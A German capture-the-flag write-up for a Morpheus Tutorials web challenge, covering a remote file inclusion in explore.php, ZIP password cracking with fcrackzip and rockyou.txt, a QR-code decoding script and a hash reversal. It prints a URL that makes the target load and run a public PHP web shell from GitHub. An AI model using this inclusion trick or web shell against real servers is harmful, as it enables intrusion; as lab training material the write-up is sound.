# Solution of [HC 0x0e](https://challenges.the-morpheus.de) from [The Morpheus Tutorials](https://the-morpheus.de)

### 1. Analyse der Webseite
Um auf das Impressum oder das Gästebuch zuzugreifen wird die Datei explore.php mit dem GET Parameter file aufgerufen, das wird im HTML Quellcode deutlich.
```html
...
<li class="nav-item"><a class="nav-link" href="explore.php?file=https://the-morpheus.de/faq.html">Impressum</a></li>
<li class="nav-item"><a class="nav-link" href="explore.php?file=guests.php">Gästebuch</a></li>
...
```

Auch die `robots.txt` kann hilfreich sein. In diesem Fall sollen Suchmachinen die Datei explore.php nicht indexieren.
```
Disallow: explore.php
```

### 2. Finden und Ausnutzen der Sicherheitslücke (local file inclusion) in der Datei `explore.php`
Wenn man die Datei ohne das GET Parameter `file` aufruft, gibt es die Fehlermeldung:
```
missing get parameter "file"
```

Beim versuch auf nicht HTML/PHP Dateien zuzugreifen erscheint eine Fehlermeldung das die Dateiendung (extension) nicht erlaubt ist.

Das Impressum wird über http eingebunden, das könnte auf eine remote file inclusion hindeuten. Wenn allerdings nur html dateien von anderen Servern eingebunden werden dürfen, bringt das recht wenig. Versuchen wir es mit einer [PHP WebShell](https://github.com/Arrexel/phpbash).

[http://185.244.192.170:20006/explore.php?file=https://raw.githubusercontent.com/Arrexel/phpbash/master/phpbash.php](http://localhost:8080/explore.php?file=https://raw.githubusercontent.com/Arrexel/phpbash/master/phpbash.php)


Ok, das hat funktioniert. Nun hat man eine Interaktive Bash Shell. Die Aufgabenstellung verrät das sich im Homeverzeichnis eines Benutzers eine ZIP Datei befindet.

An diesem Punkt sollte man sich nicht nur auf die Aufgabenstellung konzentrieren. Neben der eigentlichen Challenge im Homeverzeichnis gibt es auch eine Special Challenge. [Klick hier um zum write up zu kommen.](./solution_de_special_challenge.md)

### 3. ZIP Datei herunterladen und entschlüsseln
Es gibt verschiedene Möglichkeiten die Datei herunterzuladen. Am einfachsten ist, die Datei in `/var/www/html` zu kopieren und mit dem Browser darauf zuzugreifen.

Da die ZIP Datei mit einem Passwort geschützt ist muss dieses erst durch einen Directory Angriff mit der bekannten Wordlist [rockyou.txt](http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2) und einem Tool wie fcrackzip herausgefunden werden.
```
$ fcrackzip -D -u -p rockyou.txt secret.zip
PASSWORD FOUND!!!!: pw == sunshine
```

### 4. Inhalt der ZIP Datei analysieren und in QR Code umwandeln. (Challenge + Texte by @youreMine)
#### 4.1 Erkennen des Binärcodes
Man erkennt den QR Code sobald man den Text in gleichgroße Absätze aufteilt.

#### 4.2 Script zum Umwandeln der Binärdatei in einen QR Code erstellen.
```python3
from PIL import Image
import textwrap

with open("input_binary_or_not.txt", "r") as f:
    string = f.read()

converted = []

for row in textwrap.wrap(string, 530)[0::10]:
    converted.append(row.replace("0", " ")[0::10])
    print(row.replace("0", " ")[0::10])

img = Image.new('RGB', (len(converted[0]), len(converted)), "white")
pixels = img.load()

for y in range(img.size[0]):
    for x in range(img.size[1]):
        if converted[x][y] == "1":
            pixels[y, x] = (0, 0, 0)

img.save("output_qr.png")
```

**Alternative Lösung von @MaxiHuhe04**
```python
from PIL import Image, ImageDraw

data = open("input_binary_or_not.txt").read()
size = int(len(data) ** 0.5)
im = Image.new("1", (size, size))
draw = ImageDraw.Draw(im)

for i, b in enumerate(data):
        draw.point((i % size, i // size), not int(b))

im.show()
```

Anschließend kann man den QR Code in der Datei `output_qr.png` scannen und enthält die Ausgabe:
```
a336f671080fbf4f2a230f313560ddf0d0c12dfcf1741e49e8722a234673037dc493caa8d291d8025f71089d63cea809cc8ae53e5b17054806837dbe4099c4ca=sha512(text)
```

![QR Code Scanner](https://i.imgur.com/PW9Mkpb.jpg)

### 5. Hash in Text umwandeln
Der gefundene Hash kann anschließend über das [Hashtoolkit](http://hashtoolkit.com/reverse-hash/?hash=a336f671080fbf4f2a230f313560ddf0d0c12dfcf1741e49e8722a234673037dc493caa8d291d8025f71089d63cea809cc8ae53e5b17054806837dbe4099c4ca) oder über Hashcat in ein Text zurückentwickelt werden.

Der mit `sha512` gehashte Text lautet: `mypassword`
